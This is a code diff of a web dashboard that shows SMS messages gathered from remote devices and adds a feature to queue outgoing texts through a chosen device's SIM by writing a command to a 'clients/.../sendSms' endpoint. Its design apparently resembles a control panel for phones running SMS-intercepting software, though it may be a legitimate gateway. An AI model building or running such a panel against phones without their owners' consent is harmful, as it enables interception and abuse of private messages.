     let message = '', sender = 'Unknown', dateTime = '', type = 'incoming';
-    if (typeof m === 'string') { message = m; }
+    if (typeof m === 'string') message = m;
     else if (typeof m === 'object') {
       message = m.message || m.body || m.text || m.msg || m.content || m.sms || '';
       sender = m.sender || m.from || m.number || m.phoneNumber || m.phone || m.address || 'Unknown';
@@ -772,8 +962,64 @@ function parseDateTime(dt) {
   return isNaN(d.getTime()) ? 0 : d.getTime();
 }
 
-function closeModal(id) {
-  $(id).classList.remove('open');
+// ═══════ SEND SMS ═══════
+function updateDevDisp() {
+  if (!selDev) return;
+  const d = selDev;
+  $('devDisp').innerHTML = `
+    <div class="dd-dot ${d.status ? 'on' : 'off'}" style="${d.status ? 'background:var(--emerald);' : 'background:var(--dim);'}"></div>
+    <div style="flex:1"><div class="dd-name">${esc(d.name)}</div><div class="dd-id">${esc(d.id)}</div></div>
+    <span style="font-size:10px;font-weight:700;color:${d.status ? 'var(--emerald)' : 'var(--rose)'}">${d.status ? 'Online' : 'Offline'}</span>`;
+  const s1 = d.sims[0], s2 = d.sims[1];
+  $('sim1num').textContent = s1 ? formatPhone(s1.phoneNumber || s1.phone || '') : 'No SIM';
+  $('sim2num').textContent = s2 ? formatPhone(s2.phoneNumber || s2.phone || '') : 'No SIM';
+  $('sb2').style.opacity = s2 ? '1' : '0.4';
+}
+
+function selSim(n) {
+  curSim = n;
+  $('sb1').className = 'stb' + (n === 1 ? ' s1' : '');
+  $('sb2').className = 'stb' + (n === 2 ? ' s2' : '');
+}
+
+function copySimNum(n) {
+  if (!selDev) return;
+  const s = selDev.sims[n - 1];
+  const raw = s ? (s.phoneNumber || s.phone || '') : '';
+  if (!raw) { toast('No number'); return; }
+  const num = formatPhone(raw);
+  if (navigator.clipboard) navigator.clipboard.writeText(num).then(() => toast('📋 Copied: ' + num));
+}
+
+async function sendSms() {
+  if (!selDev) { toast('⚠ Select device first'); return; }
+  const to = $('sendTo').value.trim();
+  const msg = $('sendMsg').value.trim();
+  if (!to || !msg) { toast('⚠ Fill both fields'); return; }
+  const btn = $('sendBtn');
+  btn.disabled = true; btn.textContent = 'Sending...';
+  try {
+    const url = buildUrl(selDev._fb, `clients/${selDev.id}/webhookEvent/sendSms`);
+    const res = await fetch(url, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ from: curSim, to, message: msg, isSended: false })
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    showRes(true, '✅ SMS queued');
+    $('sendMsg').value = ''; $('sendTo').value = '';
+  } catch (e) {
+    showRes(false, '⚠ Failed: ' + e.message);
+  }
+  btn.disabled = false; btn.textContent = '📤 Send SMS';
+}
+
+function showRes(ok, msg) {
+  const el = $('sendRes');
+  el.textContent = msg;
+  el.className = 'send-res ' + (ok ? 'res-ok' : 'res-err');
+  el.style.display = 'block';
+  setTimeout(() => el.style.display = 'none', 4000);
 }
 </script>
 </body>
